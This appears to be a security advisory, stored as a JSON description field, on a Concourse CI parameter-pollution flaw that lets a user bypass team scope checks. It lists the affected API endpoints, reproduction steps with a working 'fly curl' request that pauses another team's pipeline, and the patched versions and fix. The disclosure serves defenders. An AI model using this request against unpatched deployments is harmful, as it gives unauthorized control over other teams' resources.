    "Description": "### Impact\nFor some Post/Put Concourse endpoint containing `:team_name` in the URL, a Concourse user can send a request with body including `:team_name=team2` to bypass team scope check to gain access to certain resources belong to any other team. The user only needs a valid user session and belongs to team2.\n\nExploitable endpoints:\n```\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/builds/:build_name\", Method: \"POST\", Name: RerunJobBuild},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/pause\", Method: \"PUT\", Name: PauseJob},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/unpause\", Method: \"PUT\", Name: UnpauseJob},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/schedule\", Method: \"PUT\", Name: ScheduleJob},\n\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/pause\", Method: \"PUT\", Name: PausePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/unpause\", Method: \"PUT\", Name: UnpausePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/expose\", Method: \"PUT\", Name: ExposePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/hide\", Method: \"PUT\", Name: HidePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/rename\", Method: \"PUT\", Name: RenamePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/archive\", Method: \"PUT\", Name: ArchivePipeline},\n\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/enable\", Method: \"PUT\", Name: EnableResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/disable\", Method: \"PUT\", Name: DisableResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/pin\", Method: \"PUT\", Name: PinResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/unpin\", Method: \"PUT\", Name: UnpinResource},\n\t\n{Path: \"/api/v1/teams/:team_name/artifacts\", Method: \"POST\", Name: CreateArtifact},\n```\n\n### Steps to reproduce\n\n1. Set up a Concourse deployment with team 1 (with pipeline 1) and team 2. User is in team 2 but not team 1.\n2. Login as user to team 2.\n```\nfly -t ci login -n team2 -u user -p password\n```\n3. Try pausing pipeline 1 in team 1 using fly. Verify the command output is `pipeline 'pipeline1' not found`.\n```\nfly -t ci pause-pipeline -p pipeline1\n```\n\n\n4. Send a customized request through `fly curl` command intend to pause pipeline 1 again. \n```\nfly -t ci curl /api/v1/teams/team1/pipelines/pipeline1/pause -- -X PUT -d \":team_name=team2\" -H \"Content-type: application/x-www-form-urlencoded\"\n```\n5. pipeline 1 in team 1 will be paused.\n\nIn step 4, the parameter pollution would allow an user from any team to pause a pipeline that belongs to other team.\n\n### Patches\nConcourse [v6.7.9](https://github.com/concourse/concourse/releases/tag/v6.7.9) and [v7.8.3](https://github.com/concourse/concourse/releases/tag/v7.8.3) were both released with a fix on October 12, 2022.\n\nInstead of using [`FormValue`](https://pkg.go.dev/net/http#Request.FormValue) to parse team_name in the request, where allows body parameters to take precedence over URL query string values, both patch versions are now using `URL.Query().Get()` over multiple scope handlers to prevent the parameter pollution.\n\n### Workarounds\nNo known workarounds for existing versions.\n\n### References\n * https://github.com/concourse/concourse/pull/8566: PR with the fix\n\n### For more information\nIf you have any questions or comments about this advisory, you may reach us privately at [security@concourse-ci.org](mailto:security@concourse-ci.org).",
